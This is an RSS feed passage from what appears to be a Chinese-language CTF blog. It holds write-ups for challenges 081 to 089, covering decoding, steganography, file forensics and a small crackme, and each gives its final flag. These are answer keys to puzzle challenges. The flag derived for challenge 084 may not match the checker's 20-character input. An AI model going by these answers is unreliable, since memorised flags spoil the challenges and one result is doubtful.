sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</guid><pubDate>Wed, 06 Aug 2025 00:46:39 +0000</pubDate></item><item><title>Challenge 089</title><link>https://7r1UMPHK.github.io/post/Challenge%20089.html</link><description>![image-20250803111300907](http://7r1UMPHK.github.io/image/20250803111301164.webp)

```
N2QgNmUgNzUgNjYgNWYgNzMgMzEgNWYgNjcgNmUgMzEgNzIgMzMgNjggNzAgMzEgNjMgMzMgNDQgN2IgNDcgNDEgNGMgNDY
```

![image-20250803111333055](http://7r1UMPHK.github.io/image/20250803111333344.webp)

```
}nuf_s1_gn1r3hp1c3D{GALF
```

反向书写

https://www.dcode.fr/reverse-writing

```
FLAG{D3c1ph3r1ng_1s_fun}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20089.html</guid><pubDate>Wed, 06 Aug 2025 00:41:04 +0000</pubDate></item><item><title>Challenge 088</title><link>https://7r1UMPHK.github.io/post/Challenge%20088.html</link><description>![image-20250803110319152](http://7r1UMPHK.github.io/image/20250803110319359.webp)

音频题，还是ta0出的，那去听听怎么读的

我听了半天，结果ai听出来了，666

```
HMV{IlikeChinese}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20088.html</guid><pubDate>Wed, 06 Aug 2025 00:40:47 +0000</pubDate></item><item><title>Challenge 087</title><link>https://7r1UMPHK.github.io/post/Challenge%20087.html</link><description>![image-20250803103549525](http://7r1UMPHK.github.io/image/20250803103549762.webp)

```bash
Problem: SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg== Hint: key is kerszi and what can you see ? Flag format: flag{xxx}
```

base64解一下

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo 'SC5cLlspLlwpLlspLlwuWy5c7I6XLkgpLi4uLg=='|base64 -d
H.\.[).\).[).\.[.\쎗.H)....
```

key:kerszi

xor

![image-20250803104615642](http://7r1UMPHK.github.io/image/20250803104615923.webp)

```
F R U' R' U' R U R' F'    
```

魔法方程

https://rubikscu.be/

![image-20250803110156219](http://7r1UMPHK.github.io/image/20250803110156383.webp)

```bash
flag{T}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20087.html</guid><pubDate>Wed, 06 Aug 2025 00:40:29 +0000</pubDate></item><item><title>Challenge 086</title><link>https://7r1UMPHK.github.io/post/Challenge%20086.html</link><description>![image-20250803102805187](http://7r1UMPHK.github.io/image/20250803102805423.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 086.zip -o086

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 98681 bytes (97 KiB)

Extracting archive: 086.zip
--
Path = 086.zip
Type = zip
Physical Size = 98681

Everything is Ok

Size:       100517
Compressed: 98681
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 086   
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ ls -al
总计 103
drwxr-xr-x 1 kali kali      0 2025年 8月 2日 .
drwxr-xr-x 1 kali kali   4096 2025年 8月 2日 ..
-rwxr-xr-x 1 kali kali 100517 2024年 9月29日 EZPZ.png
```

![image-20250803102855174](http://7r1UMPHK.github.io/image/20250803102855280.webp)

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ exiftool EZPZ.png 
ExifTool Version Number         : 13.25
File Name                       : EZPZ.png
Directory                       : .
File Size                       : 101 kB
File Modification Date/Time     : 2024:09:29 08:13:27-04:00
File Access Date/Time           : 2025:08:02 22:28:55-04:00
File Inode Change Date/Time     : 2024:09:29 08:13:27-04:00
File Permissions                : -rwxr-xr-x
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 500
Image Height                    : 461
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : ICC Profile
Profile CMM Type                : Little CMS
Profile Version                 : 4.4.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2024:09:14 17:27:52
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : GIMP built-in sRGB
Profile Copyright               : Public Domain
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71393
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33002
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.15001 0.06
Device Mfg Desc                 : GIMP
Device Model Desc               : sRGB
Comment                         : MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE=
Image Size                      : 500x461
Megapixels                      : 0.231
```

![image-20250803103024253](http://7r1UMPHK.github.io/image/20250803103024563.webp)

base64 binary

```
ABG_N_SYNT{YFO}
```

是rot13，但是被耍了

![image-20250803103450684](http://7r1UMPHK.github.io/image/20250803103450943.webp)

那看lsb

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/086]
└─$ zsteg EZPZ.png
meta Comment        .. text: 'MDEwMDAwMDEgMDEwMDAwMTAgMDEwMDAxMTEgMDEwMTExMTEgMDEwMDExMTAgMDEwMTExMTEgMDEwMTAwMTEgMDEwMTEwMDEgMDEwMDExMTAgMDEwMTAxMDAgMDExMTEwMTEgMDEwMTEwMDEgMDEwMDAxMTAgMDEwMDExMTEgMDExMTExMDE='
imagedata           .. file: amd 29k coff noprebar executable
b1,r,lsb,xy         .. text: 'HMV{I7_w45_3a5y_R1GH7}'
b1,rgb,msb,xy       .. file: OpenPGP Public Key
b2,g,lsb,xy         .. file: VISX image file
b3,bgr,lsb,xy       .. file: OpenPGP Secret Key
b4,g,lsb,xy         .. text: 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUDDUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'
b4,b,lsb,xy         .. text: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD33DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
b4,b,msb,xy         .. text: ['\'' repeated 186 times]
```

flag

```
HMV{I7_w45_3a5y_R1GH7}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20086.html</guid><pubDate>Wed, 06 Aug 2025 00:40:09 +0000</pubDate></item><item><title>Challenge 085</title><link>https://7r1UMPHK.github.io/post/Challenge%20085.html</link><description>![image-20250803102242549](http://7r1UMPHK.github.io/image/20250803102242764.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 085.zip -o085

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3032 bytes (3 KiB)

Extracting archive: 085.zip
--
Path = 085.zip
Type = zip
Physical Size = 3032

Everything is Ok

Size:       2923
Compressed: 3032
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 085 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0  8月 2日 22:23 .
drwxr-xr-x 1 kali kali 4096  8月 2日 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024年 9月29日 flag.png
```

flag.png没有可显示的内容

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ exiftool flag.png 
ExifTool Version Number         : 13.25
File Name                       : flag.png
Directory                       : .
File Size                       : 2.9 kB
File Modification Date/Time     : 2024:09:29 08:11:46-04:00
File Access Date/Time           : 2025:08:02 22:23:20-04:00
File Inode Change Date/Time     : 2024:09:29 08:11:46-04:00
File Permissions                : -rwxr-xr-x
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 20
Zip Bit Flag                    : 0
Zip Compression                 : None
Zip Modify Date                 : 2024:09:14 23:42:20
Zip CRC                         : 0x00000000
Zip Compressed Size             : 0
Zip Uncompressed Size           : 0
Zip File Name                   : hidden/
Warning                         : [minor] Use the Duplicates option to extract tags for all 2 files
```

那直接解压

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ 7z x flag.png     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2923 bytes (3 KiB)

Extracting archive: flag.png
--
Path = flag.png
Type = zip
Physical Size = 2923

Everything is Ok

Folders: 1
Files: 1
Size:       2784
Compressed: 2923
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ ls -al
总计 7
drwxr-xr-x 1 kali kali    0 2025年 8月 2日 .
drwxr-xr-x 1 kali kali 4096  8月 2日 22:23 ..
-rwxr-xr-x 1 kali kali 2923 2024年 9月29日 flag.png
drwxr-xr-x 1 kali kali    0 2024年 9月14日 hidden
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/085]
└─$ cd hidden 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/x/tmp/085/hidden]
└─$ ls -al
总计 3
drwxr-xr-x 1 kali kali    0 2024年 9月14日 .
drwxr-xr-x 1 kali kali    0  8月 2日 22:26 ..
-rwxr-xr-x 1 kali kali 2784 2024年 9月14日 flag.png
```

![image-20250803102641124](http://7r1UMPHK.github.io/image/20250803102641231.webp)

```
HMV{F0r3N51C_3xP3rT_1N_7H3_R00M}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20085.html</guid><pubDate>Wed, 06 Aug 2025 00:39:51 +0000</pubDate></item><item><title>Challenge 084</title><link>https://7r1UMPHK.github.io/post/Challenge%20084.html</link><description>![image-20250803100714272](http://7r1UMPHK.github.io/image/20250803100714514.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 084.zip -o084

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 414206 bytes (405 KiB)

Extracting archive: 084.zip
--
Path = 084.zip
Type = zip
Physical Size = 414206

Everything is Ok

Files: 2
Size:       1051168
Compressed: 414206
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 084 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/084]
└─$ ls -al
总计 1031
drwxr-xr-x 1 kali kali       0  8月 2日 22:07 .
drwxr-xr-x 1 kali kali    4096  8月 2日 22:07 ..
-rwxr-xr-x 1 kali kali   16224 2024年 9月26日 hmv-012
-rwxr-xr-x 1 kali kali 1034944 2024年 9月26日 hmv-012-static

┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/084]
└─$ ./hmv-012-static      
Enter the flag: xxoo
Incorrect flag.
```

反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // eax
  int i; // [rsp+Ch] [rbp-74h]
  int v6; // [rsp+10h] [rbp-70h]
  int v7; // [rsp+14h] [rbp-6Ch]
  int v8; // [rsp+18h] [rbp-68h]
  int v9; // [rsp+1Ch] [rbp-64h]
  int v10; // [rsp+20h] [rbp-60h]
  int v11; // [rsp+24h] [rbp-5Ch]
  int v12; // [rsp+28h] [rbp-58h]
  int v13; // [rsp+2Ch] [rbp-54h]
  int v14; // [rsp+30h] [rbp-50h]
  int v15; // [rsp+34h] [rbp-4Ch]
  int v16; // [rsp+38h] [rbp-48h]
  int v17; // [rsp+3Ch] [rbp-44h]
  int v18; // [rsp+40h] [rbp-40h]
  int v19; // [rsp+44h] [rbp-3Ch]
  int v20; // [rsp+48h] [rbp-38h]
  char s1[24]; // [rsp+60h] [rbp-20h] BYREF
  unsigned __int64 v22; // [rsp+78h] [rbp-8h]

  v22 = __readfsqword(0x28u);
  printf('Enter the flag: ');
  __isoc99_scanf('%20s', s1);
  for ( i = 0; i &lt;= 19; ++i )
    *(&amp;v6 + i) = s1[i];
  if ( !strcmp(s1, 'HMV{StringsAgain?}') )
  {
    print_hint();
    return 0;
  }
  else
  {
    if ( v6 == 72
      &amp;&amp; (v4 = 8 * v7, LOBYTE(v4) = (8 * v7) ^ 0x90, (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763)
      &amp;&amp; ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096
      &amp;&amp; ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379
      &amp;&amp; v10 == 90
      &amp;&amp; ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267
      &amp;&amp; ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143
      &amp;&amp; v13 == 79
      &amp;&amp; ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648
      &amp;&amp; v15 == 95
      &amp;&amp; ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957
      &amp;&amp; ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068
      &amp;&amp; v18 == 103
      &amp;&amp; ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398
      &amp;&amp; ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595 )
    {
      puts('Congratulations! This is the correct flag.');
    }
    else
    {
      puts('Incorrect flag.');
    }
    return 0;
  }
}
```

进去print_hint函数看了眼，HMV{StringsAgain?}是假flag

写个py算一下

```python
def slv_v7():
    for i in range(32, 127):
        v7 = i
        v4_temp = 8 * v7
        v4 = (v4_temp &amp; 0xFFFFFF00) | ((v4_temp &amp; 0xFF) ^ 0x90)
        if (v4 | ((3 * (v7 ^ 0x13)) &gt;&gt; 3)) == 763:
            return chr(i)

def slv_v8():
    for i in range(32, 127):
        v8 = i
        if ((16 * v8) ^ 0x120 | ((2 * (v8 ^ 0x13)) &gt;&gt; 4)) == 1096:
            return chr(i)

def slv_v9():
    for i in range(32, 127):
        v9 = i
        if ((32 * v9) ^ 0x240 | ((6 * (v9 ^ 0x13)) &gt;&gt; 5)) == 3379:
            return chr(i)

def slv_v11():
    for i in range(32, 127):
        v11 = i
        if ((8 * (v11 ^ 0x12)) | ((3 * (v11 ^ 0x13)) &gt;&gt; 5)) == 267:
            return chr(i)

def slv_v12():
    for i in range(32, 127):
        v12 = i
        if ((20 * (v12 ^ 0x34)) | ((2 * (v12 ^ 0x23)) &gt;&gt; 4)) == 2143:
            return chr(i)

def slv_v14():
    for i in range(32, 127):
        v14 = i
        if ((56 * (v14 ^ 0x21)) | ((2 * (v14 ^ 0x33)) &gt;&gt; 2)) == 4648:
            return chr(i)

def slv_v16():
    for i in range(32, 127):
        v16 = i
        if ((24 * (v16 ^ 0x11)) | ((3 * (v16 ^ 0x22)) &gt;&gt; 3)) == 1957:
            return chr(i)

def slv_v17():
    for i in range(32, 127):
        v17 = i
        if ((24 * (v17 ^ 0x11)) | ((3 * (v17 ^ 0x23)) &gt;&gt; 3)) == 3068:
            return chr(i)

def slv_v19():
    for i in range(32, 127):
        v19 = i
        if ((24 * (v19 ^ 0x11)) | ((3 * (v19 ^ 0x22)) &gt;&gt; 3)) == 2398:
            return chr(i)

def slv_v20():
    for i in range(32, 127):
        v20 = i
        if ((24 * (v20 ^ 0x11)) | ((3 * (v20 ^ 0x22)) &gt;&gt; 3)) == 2595:
            return chr(i)

if __name__ == '__main__':
    flag = ['' for _ in range(15)]
    
    flag[0] = 'H'
    flag[1] = slv_v7()
    flag[2] = slv_v8()
    flag[3] = slv_v9()
    flag[4] = 'Z'
    flag[5] = slv_v11()
    flag[6] = slv_v12()
    flag[7] = 'O'
    flag[8] = slv_v14()
    flag[9] = '_'
    flag[10] = slv_v16()
    flag[11] = slv_v17()
    flag[12] = 'g'
    flag[13] = slv_v19()
    flag[14] = slv_v20()
    
    print(''.join(flag))
```

flag

```bash
HMV{Z0nl_bigt}
```



sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20084.html</guid><pubDate>Wed, 06 Aug 2025 00:39:35 +0000</pubDate></item><item><title>Challenge 083</title><link>https://7r1UMPHK.github.io/post/Challenge%20083.html</link><description>![image-20250803095854556](http://7r1UMPHK.github.io/image/20250803095903114.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 083.zip -o083

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 804934 bytes (787 KiB)

Extracting archive: 083.zip
--
Path = 083.zip
Type = zip
Physical Size = 804934

Everything is Ok

Size:       1516128
Compressed: 804934
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd 083
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ ls -al                
总计 1485
drwxr-xr-x 1 kali kali       0  8月 2日 21:59 .
drwxr-xr-x 1 kali kali    4096  8月 2日 21:59 ..
-rwxr-xr-x 1 kali kali 1516128 2024年 8月26日 secret

┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ head -n 10 secret 
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0271 0000 0190 0806 0000 00c1 7d36  ...q..........}6
00000020: 8200 0020 0049 4441 5478 5eec 9d07 9c5d  ... .IDATx^....]
00000030: 45d5 c067 b37d d37b af84 2484 2420 bd08  E..g.}.{..$.$ ..
00000040: 0888 0554 1450 143f ac88 8a15 6cd8 150b  ...T.P.?....l...
00000050: 62c3 aea8 8852 6c54 7b41 102c 8080 0212  b....RlT{A.,....
00000060: 0221 a186 12d2 7bd9 92fd ceff dc77 36b3  .!....{......w6.
00000070: 93b9 77ee ee4b 4854 1ebf b0bb efde 3b77  ..w..KHT......;w
00000080: ea99 ff9c 73e6 4ccd 9f7f 7c6e e7c6 8d1b  ....s.L...|n....
00000090: ddf0 e1c3 dd9d 77de e996 2e5f e6c6 8c19  ......w...._....
```

secret经过查看是xxd png的结果

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/083]
└─$ xxd -r secret &gt; secret.png
```

![secret](http://7r1UMPHK.github.io/image/20250803100524026.webp)

图片上有个base64

```bash
SE1We2FuY2llbnR0aW1lczE40DB9Cg==
```

去CyberChef解码

```bash
HMV{ancienttimes1880}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20083.html</guid><pubDate>Wed, 06 Aug 2025 00:39:21 +0000</pubDate></item><item><title>Challenge 082</title><link>https://7r1UMPHK.github.io/post/Challenge%20082.html</link><description>![image-20250803000325430](http://7r1UMPHK.github.io/image/20250803000325640.webp)

# 1. 初步分析与信息获取

首先，我们拿到了一个名为 `082.zip` 的压缩文件。通过 `7z` 命令解压后，得到一个 `082.bin` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 082.zip -o82
...
Everything is Ok
```

使用 `file` 和 `ls -al` 查看文件信息，确认它是一个大小仅为 61 字节的二进制数据文件。

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/82]
└─$ file 082.bin
082.bin: data

┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/82]
└─$ ls -al
-rwxr-xr-x 1 kali kali   61 2024年 4月19日 082.bin
```

直接 `cat` 文件，可以看到一堆乱码，但其中夹杂着一些可识别的“花式”字符，并且能勉强看出 `HMV{...}` 的结构，这与题目提示相符。

&gt; 题目提示:
&gt; 8Universal 16Threads of 32Friendship. Flag format: HMV{...}
&gt; 8Universal 加密后的数据以 UTF-8 编码呈现

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/82]
└─$ cat 082.bin 
Ⓗ&lt;�\��6{�w𝕠5ؠ��5ݾ��_𝙤5�'�_5��𝓕}
```

使用 `xxd -p` 得到文件的完整十六进制表示，这是我们后续分析的基础：

```bash
e292bd3cd85cddff367b0000000001d477f09d95a035d8a0ded835ddbeff
d501000000005ff09d99a435d827de005f35ff00000001d413f09d93957d
00
```

# 2. 核心突破：识别混合编码

这是解开谜题最关键的一步。我们将注意力集中在文件开头的 `HMV` 部分。通过在 CyberChef 等工具中反复尝试，我们发现它是由多种编码方式混合而成的：

*   **H**: 由字节 `e292bd` 表示。这在 **UTF-8** 编码下，正好是带圈字母 `Ⓗ`。
*   **M**: 由字节 `3cd85cdd` 表示。这在 **UTF-16LE** (小端序) 编码下，是带圈字母 `🅜`。
*   **V**: 由字节 `ff36` 表示。这在 **UTF-16BE** (大端序) 编码下，是全角字母 `Ｖ`。

这个发现证实了题目提示 `'8Universal 16Threads of 32Friendship'` 的含义：Flag 中的字符被替换为了各种“花式”Unicode 字符，并且这些字符自身又分别使用了 UTF-8、UTF-16 甚至 UTF-32 进行了编码，最后拼接在一起。

# 3. 逐个击破：解码 Flag 内容

我们识别出 `7b` 是 `{` 的 ASCII 码，`7d00` 代表 `}`。接下来，我们对花括号中间的核心数据进行逐个解码：

`00000000 01d477f09d95a035d8a0ded835ddbeff d50100000000 5ff09d99a435d827de00 5f35ff00000001d413f09d9395`

通过细致地手动分段和解码，我们拼凑出 Flag 的各个部分：

1.  `0001d477` -&gt; **UTF-32BE** -&gt; `𝑷` (对应 'p')
2.  `f09d95a0` -&gt; **UTF-8** -&gt; `𝕠` (对应 'o')
3.  `35d8a0de` -&gt; **UTF-32LE** -&gt; `w`
4.  `d835ddbe` -&gt; **UTF-16BE** -&gt; `𝗲` (对应 'e')
5.  `ffd501` -&gt; **UTF-32LE** -&gt; `𝗿` (对应 'r')
6.  `5f` -&gt; **ASCII** -&gt; `_`
7.  `f09d99a4` -&gt; **UTF-8** -&gt; `𝙤` (对应 'o')
8.  `f09d9395` -&gt; **UTF-8** -&gt; `𝓕` (对应 'f')
9.  `5f` -&gt; **ASCII** -&gt; `_`
10.  `35ff` -&gt; **UTF-16LE** -&gt; `Ｕ` (对应 'U')
11.  `0001d413`-&gt; **UTF-32BE** -&gt; `𝐓` (对应 't')
12.  `f09d9395` -&gt; **UTF-8** -&gt; `𝓕` (对应 'f')

# 4. 结论

最终的 Flag 是：

```
HMV{power_of_Utf}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20082.html</guid><pubDate>Wed, 06 Aug 2025 00:39:02 +0000</pubDate></item><item><title>Challenge 081</title><link>https://7r1UMPHK.github.io/post/Challenge%20081.html</link><description>![image-20250729212955995](http://7r1UMPHK.github.io/image/20250729212956244.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 081.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1074 bytes (2 KiB)

Extracting archive: 081.zip
--
Path = 081.zip
Type = zip
Physical Size = 1074

Everything is Ok

Size:       918
Compressed: 1074
                    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat -A message.txt 
 ^I   ^I  $
  ^I^I    $
 ^I  ^I^I^I $
 ^I ^I ^I  $
 ^I ^I^I^I^I^I$
 ^I ^I ^I^I^I$
  ^I^I    $
 ^I ^I  ^I $
 ^I ^I  ^I $
 ^I ^I^I  ^I$
 ^I ^I^I^I^I^I$
 ^I   ^I^I^I$
 ^I ^I ^I ^I$
 ^I ^I^I  ^I$
  ^I^I ^I ^I$
 ^I ^I^I^I^I^I$
$
$
$
^I   $
   ^I^I$
  ^I^I ^I$
^I   $
    ^I$
^I ^I $
^I ^I$
  ^I^I ^I$
   $
^I^I^I^I^I$
^I^I^I^I^I$
^I $
^I ^I ^I^I$
  ^I^I ^I$
$
$
$
   ^I   ^I^I^I$
^I$
      ^I^I    $
^I$
     ^I ^I ^I  $
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I ^I  $
^I$
      ^I^I ^I  $
^I$
     ^I  ^I ^I^I$
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I^I$
^I$
      ^I^I ^I  $
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I^I^I^I^I$
^I$
      ^I^I    $
^I$
     ^I   ^I^I $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I ^I  ^I^I$
^I$
      ^I^I    $
^I$
     ^I  ^I^I ^I$
^I$
     ^I   ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I    ^I $
^I$
     ^I ^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I   ^I$
^I$
     ^I  ^I^I^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I ^I ^I$
^I$
      ^I^I ^I ^I$
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I     ^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I    $
^I$
     ^I ^I ^I ^I$
^I$
     ^I  ^I^I^I $
^I$
     ^I   ^I  $
^I$
     ^I ^I^I^I^I^I$
^I$
     ^I  ^I   $
^I$
      ^I^I  ^I^I$
^I$
     ^I ^I  ^I $
^I$
      ^I^I  ^I^I$
^I$
      ^I^I^I ^I $
^I$
      ^I ^I  ^I$
^I$
```

看着像之前那个空白加密Whitespace

结果不是.....

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hexdump -C message.txt
00000000  20 09 20 20 20 09 20 20  0a 20 20 09 09 20 20 20  | .   .  .  ..   |
00000010  20 0a 20 09 20 20 09 09  09 20 0a 20 09 20 09 20  | . .  ... . . . |
00000020  09 20 20 0a 20 09 20 09  09 09 09 09 0a 20 09 20  |.  . . ...... . |
00000030  09 20 09 09 09 0a 20 20  09 09 20 20 20 20 0a 20  |. ....  ..    . |
00000040  09 20 09 20 20 09 20 0a  20 09 20 09 20 20 09 20  |. .  . . . .  . |
00000050  0a 20 09 20 09 09 20 20  09 0a 20 09 20 09 09 09  |. . ..  .. . ...|
00000060  09 09 0a 20 09 20 20 20  09 09 09 0a 20 09 20 09  |... .   .... . .|
00000070  20 09 20 09 0a 20 09 20  09 09 20 20 09 0a 20 20  | . .. . ..  ..  |
00000080  09 09 20 09 20 09 0a 20  09 20 09 09 09 09 09 0a  |.. . .. . ......|
00000090  0a 0a 0a 09 20 20 20 0a  20 20 20 09 09 0a 20 20  |....   .   ...  |
000000a0  09 09 20 09 0a 09 20 20  20 0a 20 20 20 20 09 0a  |.. ...   .    ..|
000000b0  09 20 09 20 0a 09 20 09  0a 20 20 09 09 20 09 0a  |. . .. ..  .. ..|
000000c0  20 20 20 0a 09 09 09 09  09 0a 09 09 09 09 09 0a  |   .............|
000000d0  09 20 0a 09 20 09 20 09  09 0a 20 20 09 09 20 09  |. .. . ...  .. .|
000000e0  0a 0a 0a 0a 20 20 20 09  20 20 20 09 09 09 0a 09  |....   .   .....|
